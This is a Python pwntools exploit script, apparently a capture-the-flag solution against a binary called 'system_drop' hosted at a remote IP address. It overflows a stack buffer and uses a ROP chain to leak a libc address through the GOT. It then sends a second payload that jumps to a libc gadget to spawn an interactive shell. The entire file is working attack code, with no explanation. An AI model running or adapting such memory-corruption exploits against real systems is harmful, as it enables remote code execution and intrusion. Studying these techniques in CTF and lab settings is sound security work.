from pwn import *
import time

context.arch = "amd64"

c = remote("138.68.147.93", 31253)
#c = process("./system_drop")

def main():
	log.info("Exploit developed by pwnhacker0x18 also 'furry shark lover'")
	syscall = 0x000000000040053b
	pop_rdi = 0x00000000004005d3
	pop_rsi_r15 = 0x00000000004005d1
	pop_all = 0x00000000004005cc
	alarm_got = 0x601018
	read_got = 0x601020
	sys_off = 0x048e50
	sh_off = 0x18a156

	payload = b'A'*40
	payload += p64(0x400440)
	payload += p64(pop_rdi)
	payload += p64(0x1)
	payload += p64(pop_rsi_r15)
	payload += p64(alarm_got)
	payload += b'A'*8
	payload += p64(syscall)
	payload += p64(0x0000000000400541)

#	gdb.attach(c)
	c.sendline(payload)
	time.sleep(1)
	c.send("1")
	leak = u64(c.recv()[0:8])
	log.success("leak alarm(): " + hex(leak))
	libc = leak - 0x0e4610
	log.success("libc base address: " + hex(libc))
	system = libc + sys_off
	bin_sh = libc + sh_off

	payload = b'A'*40
	payload += p64(pop_all)
	payload += b'\x00'*32
	payload += p64(libc + 0x10a41c)
	#payload += p64(pop_rdi)
	#payload += p64(bin_sh)
	#payload += p64(system)
	time.sleep(1)
	c.sendline(payload)
	log.success("pwn, pwn, pwn")
	c.interactive()

if __name__ == '__main__':
	main()
